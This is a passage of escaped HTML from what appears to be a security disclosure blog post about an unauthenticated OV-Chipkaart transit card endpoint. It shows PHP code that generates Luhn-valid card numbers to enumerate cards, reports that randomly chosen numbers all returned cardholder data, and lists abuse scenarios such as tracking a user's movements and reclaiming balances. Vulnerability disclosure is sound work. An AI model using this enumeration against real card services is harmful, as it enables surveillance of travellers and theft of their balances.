\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nv\"\u003e$o\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$o\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$fh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003efopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003e__DIR__\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nx\"\u003eDIRECTORY_SEPARATOR\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;numbers.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;a+\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$prefix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e35280200\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e100000000\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nv\"\u003e$number\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;%d%08d\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$prefix\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eluhnCheck\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$number\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003efwrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$fh\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$number\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nx\"\u003ePHP_EOL\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003efclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$fh\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt resulted in a file of 170 MB with 10 million card numbers. Next I picked 5 random numbers;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003erl \u003cspan class=\"nt\"\u003e-c\u003c/span\u003e 5 numbers.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e… and tried them all of them with the endpoint. All requests were successful and returned the same data structure as I received with my own card number.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe impact of this publicly accessible endpoint is huge. I will give three scenarios, but there are a lot more use cases for what you could do with this data.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eQuerying the data of one specific OV-Chipkaart for every minute over a period of a month would give me a good insight into the daily schedule of its user. Calculating the difference of the card’s balance each time I query the data can give me an indication of where the user lives and traveling to since the fares for each route are pretty specific.\u003c/li\u003e\n\u003cli\u003eFetching the data of all possible card numbers gives me a nice insight into the average user. I could make charts of the average age of all users. The average balance of all users. The average card type. The total amount of money still available on cards.\u003c/li\u003e\n\u003cli\u003eUsing this form would give me the opportunity to reclaim the balance (max. € 20,-) of anonymous cards expired less than a year ago.\u003c/li\u003e\n\u003c/ol\u003e\n"}]}